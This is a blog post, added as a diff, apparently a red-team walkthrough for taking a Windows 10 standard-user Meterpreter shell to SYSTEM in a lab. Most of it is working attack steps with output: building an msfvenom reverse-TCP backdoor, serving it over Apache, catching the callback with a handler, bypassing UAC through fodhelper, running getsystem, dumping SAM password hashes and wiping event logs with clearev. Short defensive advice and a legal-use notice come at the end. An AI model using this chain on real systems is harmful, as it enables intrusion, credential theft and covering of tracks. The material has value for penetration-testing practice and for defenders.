@@ -1,0 +1,181 @@
+---
+title: "From Dummy to SYSTEM: UAC Bypass and Privilege Escalation"
+date: "2026-06-25"
+excerpt: "A Meterpreter foothold as a standard user is only the start. Walking a low-priv shell up to NT AUTHORITY\\SYSTEM by bypassing UAC — and why the SAM stays locked until you do."
+tags: ["Windows", "Red Team", "Post-Exploitation"]
+---
+
+Initial access is rarely the hard part — turning a normal-user shell into something that can
+read the SAM, clear logs, and pivot is. Privilege escalation is the act of leaning on a bug,
+misconfiguration, or design gap to reach resources the OS deliberately keeps away from your
+current token. It comes in two flavours: **vertical** (a low-priv user climbing to admin or
+SYSTEM) and **lateral** (moving sideways into another account at the same level). This
+walkthrough is the vertical case — a `dummy` Meterpreter session walked up to `NT
+AUTHORITY\SYSTEM`.
+
+## Why the foothold isn't enough
+
+A shell running as a standard user is boxed in by design. Two things prove it immediately:
+
+- **The SAM is off-limits.** `smart_hashdump` needs SYSTEM to read the account database. As a
+  normal user it fails with *Insufficient privileges to dump hashes*.
+- **`getsystem` is blocked.** The usual token-stealing trick (Named Pipe Impersonation) returns
+  *Access is denied* because User Account Control stands between you and an elevated token.
+
+The job, then, is to get UAC out of the way — and on a default Windows 10 box there's a clean,
+fileless way to do exactly that.
+
+## Lab setup
+
+Two VMs on the same segment:
+
+- **Kali Linux** — the attacker, with Metasploit and Apache (`apt-get install apache2` if it
+  isn't already there). Note Kali's IP with `ip a`; this guide uses `10.0.2.42` for `LHOST`.
+- **Windows 10** — the victim, logged in as a standard user (`dummy`).
+
+## Reproducing it step by step
+
+### 1. Build the backdoor
+
+Generate a reverse-TCP Meterpreter executable with `msfvenom`. `LHOST` is your Kali IP, and the
+`shikata_ga_nai` encoder plus a null-byte badchar filter keep the payload clean:
+
+```bash
+msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 \
+  -e x86/shikata_ga_nai -b "\x00" LHOST=10.0.2.42 -f exe > Desktop/Exploit.exe
+```
+
+### 2. Serve it over HTTP
+
+Stand up a quick delivery channel with Apache. Set a server name, drop the payload in a shared
+directory, and fix permissions/ownership so Apache can serve it:
+
+```bash
+# Silence the FQDN warning.
+echo "ServerName localhost" >> /etc/apache2/apache2.conf
+
+# Public share directory, world-readable, owned by the web user.
+mkdir -p /var/www/html/share/
+chmod -R 755 /var/www/html/share/
+chown -R www-data:www-data /var/www/html/share/
+
+# Stage the backdoor and start serving.
+cp /root/Desktop/Exploit.exe /var/www/html/share/
+service apache2 start
+```
+
+### 3. Start the handler
+
+In Metasploit, catch the callback with `multi/handler`. Match the payload and `LHOST` to what
+you built, then background the listener:
+
+```bash
+msfconsole
+```
+
+```text
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST 10.0.2.42
+exploit -j -z
+# [*] Started reverse TCP handler on 10.0.2.42:4444
+```
+
+### 4. Land the session
+
+On the Windows 10 machine, browse to the share, download the file, and run it. If an **Open
+File – Security Warning** appears, click **Run**.
+
+```text
+http://10.0.2.42/share/        # → click Exploit.exe → Run
+```
+
+Back on Kali the handler reports a new session:
+
+```text
+[*] Meterpreter session 1 opened (10.0.2.42:4444 -> 10.0.2.15:49804)
+```
+
+### 5. Confirm you're boxed in
+
+Interact with the session and check your token. You're the standard user, and the SAM is locked:
+
+```text
+sessions -i 1
+
+meterpreter > getuid
+Server username: DESKTOP-ICB2IQ4\dummy
+
+meterpreter > run post/windows/gather/smart_hashdump
+[-] Insufficient privileges to dump hashes!
+
+meterpreter > getsystem -t 1
+[-] priv_elevate_getsystem: Operation failed: Access is denied.
+[-] Named Pipe Impersonation (In Memory/Admin)
+```
+
+Both failures point at the same wall: UAC.
+
+### 6. Bypass UAC with fodhelper
+
+Background the session and run the `bypassuac_fodhelper` local exploit. It abuses an
+auto-elevating, signed Windows binary (`fodhelper.exe`) that reads a user-writable registry key
+— no file dropped, no prompt shown. Point it at your existing session and run:
+
+```text
+background
+use exploit/windows/local/bypassuac_fodhelper
+set SESSION 1
+run
+```
+
+A second Meterpreter session opens. Note that `getuid` still shows `dummy` — the bypass got you
+an *elevated* token for that user, not SYSTEM yet. That last step is now unblocked:
+
+```text
+meterpreter > getuid
+Server username: DESKTOP-ICB2IQ4\dummy
+
+meterpreter > getsystem -t 1
+...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
+
+meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
+```
+
+### 7. Cash it in
+
+With a SYSTEM token the SAM opens up. The same `smart_hashdump` that failed in step 5 now dumps
+the NTLM hashes:
+
+```text
+meterpreter > run post/windows/gather/smart_hashdump
+[+] Dumping password hashes...
+# Administrator:500:aad3b...:31d6c...:::
+```
+
+From here the elevated session can do what the foothold couldn't — read the SAM, run `clearev`
+to wipe event logs, and pivot onward.
+
+## Where the real risk sits
+
+The backdoor and the handler are interchangeable plumbing; the durable lesson is the
+**escalation chain**, and it's the defender's to break:
+
+- **Don't lean on default UAC as a security boundary.** Microsoft itself doesn't treat it as
+  one. Set UAC to *Always notify* and the fodhelper-style auto-elevation paths get noisier and
+  harder.
+- **Catch the foothold first.** Application allow-listing and EDR stop the unsigned `Exploit.exe`
+  before any of this matters — every later step assumes arbitrary code already ran.
+- **Watch the tells.** New sessions, `fodhelper.exe` spawning a shell, writes to its hijackable
+  registry key, and SAM access are all detectable; the chain is only invisible if nobody's
+  looking.
+
+Privilege escalation isn't one exploit — it's a sequence where each link assumes the previous
+one succeeded. Break any link and the climb from `dummy` to SYSTEM stalls.
+
+<Callout>
+This is a standard post-exploitation chain for authorized assessments and lab practice. Only
+run it against machines you own or have explicit written permission to test — deploying backdoors
+or escalating privileges on systems you don't control is illegal.
+</Callout>
